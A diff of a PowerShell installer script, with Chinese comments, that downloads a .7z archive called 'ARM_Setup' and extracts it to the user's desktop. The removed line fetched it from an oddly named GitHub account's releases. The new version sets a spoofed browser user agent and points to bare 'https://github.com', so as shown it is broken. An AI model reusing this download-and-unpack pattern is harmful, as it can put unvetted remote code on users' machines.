@@ -1,14 +1,37 @@
-$url = "https://github.com/windowslnk133-gif/ARM/releases/download/AI/ARM_Setup.7z"
+# 確保下載時使用正確的安全協議
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# 1. 定義下載網址與本地路徑
+$url = "https://github.com"
 $savePath = "$env:TEMP\ARM_Setup.7z"
-$desktopDir = "$env:UESRPROFILE\Desktop\ARM_App"
+$desktopDir = "$env:USERPROFILE\Desktop\ARM_App"
 
-Write-Host "Installing ARM..." -ForegroundColor Cyan
+Write-Host "==========================================" -ForegroundColor Cyan
+Write-Host "  installing (91MB)" -ForegroundColor Cyan
+Write-Host "==========================================" -ForegroundColor Cyan
 
-Invoke-WedRequest -Uri $url -OutFlie $savePath
+# 2. 開始下載檔案（這裡已修正為正確的 -OutFile）
+try {
+    Invoke-WebRequest -Uri $url -OutFile $savePath -UserAgent "Mozilla/5.0"
+} catch {
+    Write-Error "install error"
+    exit
+}
 
-if (!(Test-Path $desktopDir)) { New-Item -ItemType Directory -Path $desktopDir | Out-Null }
-Write-Host "Please wait..."
+# 3. 自動建立桌面資料夾並解壓 .7z 檔案
+if (!(Test-Path $desktopDir)) { 
+    New-Item -ItemType Directory -Path $desktopDir | Out-Null 
+}
+
+Write-Host "install on [ARM_App] ..." -ForegroundColor Yellow
 tar -xf $savePath -C $desktopDir
 
-Remove-Item $savePath
+# 4. 刪除暫存的壓縮檔
+if (Test-Path $savePath) {
+    Remove-Item $savePath
+}
+
+Write-Host ""
 Write-Host "[Notification] Success" -ForegroundColor Green
+Write-Host "==========================================" -ForegroundColor Green
+
